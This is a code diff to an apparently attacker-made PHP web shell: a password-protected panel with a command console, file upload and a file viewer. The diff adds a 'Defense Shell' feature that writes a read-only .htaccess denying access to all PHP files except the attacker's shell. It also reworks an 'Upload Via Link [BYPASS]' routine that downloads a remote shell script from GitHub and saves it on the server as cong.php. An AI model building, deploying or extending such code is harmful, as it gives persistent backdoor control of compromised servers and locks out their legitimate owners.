@@ -36,7 +36,6 @@ $Array = [
 	$correctPassword = "heker"; //Change Password
 	if (isset($_POST['pass'])) {
 		$enteredPassword = $_POST['pass'];
-
 		if ($enteredPassword === $correctPassword) {
 			$_SESSION['forbidden'] = true;
 		} else {
@@ -113,7 +112,7 @@ $Array = [
 	}
 	?>
 	<?php
-	echo file_get_contents("https://raw.githubusercontent.com/Mr-7Mind/AlertUpdate/main/186index.html"); // Alert for update
+	echo file_get_contents("https://raw.githubusercontent.com/Mr-7Mind/AlertUpdate/main/187index.html"); // Alert for update
 	?>
 	<?php
 	if(isset($_7["left"])) {
@@ -293,6 +292,16 @@ $Array = [
 		<script src='https://cdnjs.cloudflare.com/ajax/libs/prism/1.6.0/prism.js'></script>
 		<script src='https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js'></script>
 		<script src='https://code.jquery.com/jquery-3.3.1.slim.min.js'></script>
+		<script>
+		function toggleShellNameInput(isVisible) {
+			var shellNameInput = document.getElementById('namafile');
+			shellNameInput.required = isVisible;
+			shellNameInput.style.display = isVisible ? 'block' : 'none';
+		}
+		window.onload = function () {
+			toggleShellNameInput(false);
+		};
+	</script>
         <style>
 			@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@100;200;300;400;500;600;700;800;900&display=swap');
 			*{
@@ -397,6 +406,9 @@ $Array = [
 				<div class='text-center'>
 			<div class='btn-group'>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=uploadvialink'><i class='bi bi-upload'></i> Upload Via Link</a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=createhates'><i class='bi bi-file-earmark-plus-fill'></i> Create Htaccess</a>
+			</div>
+			<div class='btn-group'>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=upload'><i class='bi bi-upload'></i> Upload</a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=cmd'><i class='bi bi-terminal'></i> Console</a>
 			</div>
@@ -780,45 +792,6 @@ $Array = [
 			</form>
 		</div>";
 		}
-		// Upload Via Link raw
-		if ($_7['id'] == 'uploadvialink') {
-			s();
-			if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-				$url = isset($_POST['url']) ? trim($_POST['url']) : '';
-				$namafile = isset($_POST['namafile']) ? trim($_POST['namafile']) : 'cong.php';
-				if (filter_var($url, FILTER_VALIDATE_URL)) {
-					$content = file_get_contents($url);
-					if ($content !== false) {
-						$filePath = getcwd() . '/' . $namafile;
-						$result = file_put_contents($filePath, $content);
-						if ($result !== false) {
-							echo "<div><strong>Upload</strong> ok! Saved as $namafile " . ok() . "</div>";
-						} else {
-							echo '<div><strong>Upload</strong> fail! ' . er() . '</div>';
-						}
-					} else {
-						echo '<div><strong>Upload</strong> fail! ' . er() . '</div>';
-					}
-				} else {
-					echo '<div><strong>Invalid URL</strong></div>';
-				}
-			}
-			echo "
-			<div class='card card-body text-dark input-group mb-3'>
-				<u>Upload Via Link</u>
-				<form method='POST' enctype='multipart/form-data'>
-					<div class='input-group'>
-						<input class='form-control form-control-sm' type='url' name='url' placeholder='Enter the link' value='https://raw.githubusercontent.com/Mr-7Mind/MiniShell/main/ShellPass.php' required>
-					</div>
-					<div class='input-group'>
-						<input class='form-control form-control-sm' type='text' name='namafile' placeholder='Save As' value='cong.php'>
-					</div>
-					<div class='input-group'>
-						<button type='submit' name='upl' class='btn btn-primary'>Upload</button>
-					</div>
-				</form>
-			</div>";
-		}
 		if (isset($_GET['dir']) && $_GET['id'] == "scan_root") {
 			ob_implicit_flush();ob_end_flush();s();
 			echo "
@@ -870,7 +843,7 @@ $Array = [
 		// openfile
 		if(isset($_7['opn'])) {
 			$file = $_7['opn'];
-		}	
+		}
 		// view
 		if($_7['action'] == 'view') {
 		s();
@@ -1296,6 +1269,86 @@ $Array = [
 				</form>
 			</div>";
 		}
+		// create htaccess
+		if ($_7['id'] == 'createhates') {
+			s();
+			if (isset($_7['bikin'])) {
+				$selectedContent = isset($_7['content']) ? $_7['content'] : '';
+				$isiFile = '';
+				$namafile = isset($_POST['namafile']) ? $_POST['namafile'] : '';
+				if ($selectedContent == 'content1') {
+					$isiFile = "<Files ~ '\.(xml|css|jpe?g|png|gif|js|pdf|phtml|shtml|php5|php)$'>
+Allow from all
+</Files>";
+				} elseif ($selectedContent == 'content2') {
+					$isiFile = "<FilesMatch '.*\.(phtml|php|PhP|php5|suspected)$'>
+Order Allow,Deny
+Deny from all
+</FilesMatch>
+<FilesMatch '^($namafile)$'>
+Order Allow,Deny
+Allow from all
+</FilesMatch>";
+				}
+				$setNama = '.htaccess';
+				$result = file_put_contents($setNama, $isiFile);
+				chmod($setNama, 0444);
+				if ($result !== false) {
+					echo '<strong>Create file</strong> ok! ' . ok() . '</div>';
+				} else {
+					echo '<strong>Create file</strong> fail! ' . er() . '</div>';
+				}
+			}
+			echo "<div class='mb-3'>
+			<u>Defense Shell</u>
+			<form method='POST' id='defenseShellForm'>
+				<input type='hidden' name='createhates' value='1'>
+				<div class='d-grid gap-2'>
+					<label><input type='radio' name='content' value='content1' checked onclick='toggleShellNameInput(false)'> htaccess Allow All</label>
+					<label><input type='radio' name='content' value='content2' onclick='toggleShellNameInput(true)'> htaccess Only Allow Your Shell(enter name shell before create!!)</label>
+					<label>use | if you have 2 files</label>
+					<label>example:</label>
+					<label><strong>index.php|indeex.php</strong> / <strong>aa.php|bb.php|cc.php</strong></label>
+					<label id='namafile' for='namafile'>Shell Name: <input class='form-control form-control-sm' type='text' name='namafile'></label>
+					<input class='btn btn-outline-light btn-sm' type='submit' name='bikin' value='create'>
+				</div>
+			</form>
+		</div>";
+		}
+		// Upload Via Link
+		if ($_7['id'] == 'uploadvialink') {
+		s();
+		if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+				$url = isset($_POST['url']) ? trim($_POST['url']) : '';
+				$namafile = isset($_POST['namafile']) ? trim($_POST['namafile']) : 'cong.php';
+				if (filter_var($url, FILTER_VALIDATE_URL)) {
+					$content = file_get_contents($url);
+					if ($content !== false) {
+						$filePath = getcwd() . '/' . $namafile;
+						$result = file_put_contents($filePath, $content);
+						if ($result !== false) {
+							echo '<strong>Upload file</strong> ok! '.ok().'</div>';
+						}else{
+						echo '<strong>Create file</strong> fail! '.er().'</div>';}
+						}else{
+						echo '<div><strong>Invalid URL</strong> fail! '.er().'</div>';}
+				}
+			}
+			echo "<div class='card card-body text-dark input-group mb-3'>
+					<u>Upload Via Link [BYPASS]</u>
+					<form method='POST' enctype='multipart/form-data'>
+						<div class='input-group'>
+						<input class='form-control form-control-sm' type='url' name='url' placeholder='Enter the link' value='https://raw.githubusercontent.com/Mr-7Mind/MiniShell/main/ShellPass.php' required>
+					</div>
+					<div class='input-group'>
+						<input class='form-control form-control-sm' type='text' name='namafile' placeholder='Save As' value='cong.php'>
+					</div>
+					<div class='input-group'>
+						<button type='submit' name='upl' class='btn btn-primary'>Upload</button>
+					</div>
+				</form>
+			</div>";
+		}
 		// File New
 		if(isset($_7['filenew'])) {
 		s();
@@ -1451,7 +1504,7 @@ $Array = [
 			}
 		echo "
 		<tr>
-		<td><i class='bi bi-file-earmark-text-fill'></i><a class='text-decoration-none text-secondary' href='?dir=".hex($fungsi[7]())."&action=view&opn=$file'>$_f</a></td>
+		<td><i class='bi bi-file-earmark-text-fill'></i><a class='text-decoration-none text-secondary' href='?path=".hex($fungsi[7]())."&action=view&opn=$file'>$_f</a></td>
 			<td class='text-center'>file</td>
 			<td class='text-center'>$ft</td>
 			<td class='text-center'>".sz(filesize($file))."</td>
